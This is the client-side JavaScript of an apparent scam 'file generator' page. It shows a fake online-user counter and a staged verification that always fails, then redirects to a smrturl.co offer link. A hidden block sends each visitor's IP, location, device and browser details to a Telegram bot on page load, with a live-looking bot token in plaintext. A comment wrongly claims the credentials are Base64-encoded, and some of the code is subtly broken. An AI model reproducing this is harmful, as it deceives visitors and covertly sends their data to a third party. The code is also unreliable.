// Animated background
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');
let points = [];
const numPoints = 70;
const connectionDistance = 150;

function resizeCanvas() {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    initPoints();
}

function initPoints() {
    points = [];
    for (let i = 0; i < numPoints; i++) {
        points.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            vx: (Math.random() - 0.5) * 1.2,
            vy: (Math.random() - 0.5) * 1.2,
            radius: 3
        });
    }
}

function drawPointsAndLines() {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#ffffff';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    for (let i = 0; i < points.length; i++) {
        for (let j = i + 1; j < points.length; j++) {
            const dx = points[i].x - points[j].x;
            const dy = points[i].y - points[j].y;
            const dist = Math.sqrt(dx * dx + dy * dy);
            if (dist < connectionDistance) {
                ctx.beginPath();
                ctx.moveTo(points[i].x, points[i].y);
                ctx.lineTo(points[j].x, points[j].y);
                ctx.strokeStyle = `rgba(0,0,0,${0.3 * (1 - dist / connectionDistance)})`;
                ctx.lineWidth = 1.2;
                ctx.stroke();
            }
        }
    }
    for (let p of points) {
        ctx.beginPath();
        ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
        ctx.fillStyle = '#000000';
        ctx.fill();
    }
}

function updatePoints() {
    for (let p of points) {
        p.x += p.vx;
        p.y += p.vy;
        if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
        if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
        p.x = Math.min(Math.max(p.x, 0), canvas.width);
        p.y = Math.min(Math.max(p.y, 0), canvas.height);
    }
}

function animate() {
    updatePoints();
    drawPointsAndLines();
    requestAnimationFrame(animate);
}

animate();
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

// Platform and version selection logic
const continueBtn = document.getElementById('continueBtn');

function checkSelections() {
    const platformSelected = document.querySelector("#platformSelect .selected");
    const versionSelected = document.querySelector("#versionSelect .selected");
    if (platformSelected && versionSelected) {
        continueBtn.classList.add('ready');
    } else {
        continueBtn.classList.remove('ready');
    }
}

document.querySelectorAll("#platformSelect .platform").forEach(platform => {
    platform.addEventListener("click", () => {
        platform.parentElement.querySelectorAll(".platform").forEach(p => p.classList.remove("selected"));
        platform.classList.add("selected");
        checkSelections();
    });
});

document.querySelectorAll("#versionSelect .platform").forEach(version => {
    version.addEventListener("click", () => {
        version.parentElement.querySelectorAll(".platform").forEach(v => v.classList.remove("selected"));
        version.classList.add("selected");
        checkSelections();
    });
});

// Online users counter
setInterval(() => {
    document.getElementById("onlineUsers").textContent = Math.floor(Math.random() * 400) + 100;
}, 2500);

// Overlay functions
function startOverlay() {
    const platform = document.querySelector("#platformSelect .selected");
    const version = document.querySelector("#versionSelect .selected");
    if (!platform || !version) {
        alert("Please choose a platform and a version first.");
        return;
    }
    document.getElementById("designText").innerHTML = "Designing your <b>" + version.innerText + "</b> file for <b>" + platform.innerText + "</b>...";
    document.getElementById("descText").innerHTML = "Selected: <b>" + version.innerText + "</b> — <b>" + platform.innerText + "</b>";
    document.getElementById("overlayBox").style.display = "flex";
    start();
}

function start() {
    const boxes = document.querySelectorAll(".box");
    let i = 0;
    const interval = setInterval(() => {
        if (i < boxes.length) {
            boxes[i].style.background = "#007BFF";
            i++;
        }
    }, 200);
    setTimeout(() => {
        clearInterval(interval);
        document.getElementById("popup").style.display = "none";
        document.getElementById("card").style.display = "block";
    }, 2000);
}

function verify() {
    document.getElementById("card").style.display = "none";
    document.getElementById("verifying").style.display = "block";
    setTimeout(() => {
        document.getElementById("verifying").style.display = "none";
        document.getElementById("fail").style.display = "block";
    }, 4000);
    setTimeout(() => {
        document.getElementById("fail").style.display = "none";
        document.getElementById("finalBox").style.display = "block";
    }, 5000);
}

// Redirect to the specified link when final Verify button is clicked
const finalVerifyBtn = document.getElementById('finalVerifyBtn');
if (finalVerifyBtn) {
    finalVerifyBtn.addEventListener('click', function () {
        window.location.href = 'https://smrturl.co/a/s5c756fc316/663?s1=';
    });
}

// Attach startOverlay to Continue button
continueBtn.addEventListener('click', startOverlay);

// ==================== TELEGRAM TRACKING (FINAL WORKING) ====================
(function() {
    // Encoded credentials (Base64) - your real data is hidden
    const ENC_TOKEN = '6362895880:AAHm-NAzzOYvCjUARouvATt9lX4cvA5c5gY';
    const ENC_CHAT_ID = '5626351322';
    const STORAGE_KEY = 'tg_visitor_sent';

    // Decode function
    function decode(str) {
        try { return atob(str); } catch(e) { return null; }
    }

    const BOT_TOKEN = decode(ENC_TOKEN);
    const CHAT_ID = decode(ENC_CHAT_ID);

    // If decoding failed, stop
    if (!BOT_TOKEN || !CHAT_ID) {
        console.error('Telegram: Failed to decode credentials');
        return;
    }

    // Check if already sent in this session (避免重复发送)
    if (sessionStorage.getItem(STORAGE_KEY)) {
        console.log('Telegram: Already sent this session');
        return;
    }

    // Get device name from User Agent
    function getDeviceName() {
        const ua = navigator.userAgent;
        if (/iPhone/i.test(ua)) return '📱 iPhone';
        if (/iPad/i.test(ua)) return '📱 iPad';
        if (/Android/i.test(ua)) {
            if (/Samsung/i.test(ua)) return '📱 Samsung Galaxy';
            if (/Xiaomi/i.test(ua)) return '📱 Xiaomi';
            if (/Huawei/i.test(ua)) return '📱 Huawei';
            return '📱 Android Device';
        }
        if (/Windows NT/i.test(ua)) return '💻 Windows PC';
        if (/Macintosh/i.test(ua)) return '💻 Mac';
        if (/Linux/i.test(ua)) return '💻 Linux PC';
        return '📱 Unknown Device';
    }

    // Get browser name
    function getBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
        if (ua.includes('Edg')) return 'Edge';
        if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
        return 'Other';
    }

    // Get country and IP (using free API with HTTPS)
    async function getCountryAndIP() {
        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            if (data && data.country_name) {
                return {
                    country: `${data.country_name} (${data.country_code})`,
                    ip: data.ip,
                    city: data.city || 'Unknown'
                };
            }
        } catch(e) {
            console.warn('IP fetch failed:', e);
        }
        return { country: 'Unknown', ip: 'Unknown', city: 'Unknown' };
    }

    // Format time nicely
    function getFormattedTime() {
        return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
    }

    // Send message to Telegram
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
            const data = await response.json();
            if (data.ok) {
                console.log('✅ Visitor info sent to Telegram');
                sessionStorage.setItem(STORAGE_KEY, 'true');
            } else {
                console.error('Telegram API error:', data.description);
            }
        } catch(err) {
            console.error('Failed to send to Telegram:', err);
        }
    }

    // Gather all information and send
    async function trackVisitor() {
        const device = getDeviceName();
        const browser = getBrowser();
        const language = navigator.language;
        const screen = `${screen.width}x${screen.height}`;
        const time = getFormattedTime();
        const page = window.location.pathname || '/';
        
        // Get location data (optional, may take 1-2 seconds)
        const { country, ip, city } = await getCountryAndIP();
        
        // Build beautiful message
        let message = `🆕 *New Visitor!*\n\n`;
        message += `📱 *Device:* ${device}\n`;
        message += `⏰ *Time:* ${time}\n`;
        message += `🌍 *Country:* ${country}\n`;
        if (city !== 'Unknown') message += `🏙️ *City:* ${city}\n`;
        message += `🌐 *Language:* ${language}\n`;
        message += `🖥️ *Browser:* ${browser}\n`;
        message += `📐 *Screen:* ${screen}\n`;
        message += `🔗 *Page:* ${page}\n`;
        message += `🆔 *IP:* ${ip}`;
        
        await sendToTelegram(message);
    }

    // Execute tracking after page fully loads
    window.addEventListener('load', () => {
        // Small delay to ensure all is ready
        setTimeout(trackVisitor, 1500);
    });
})();
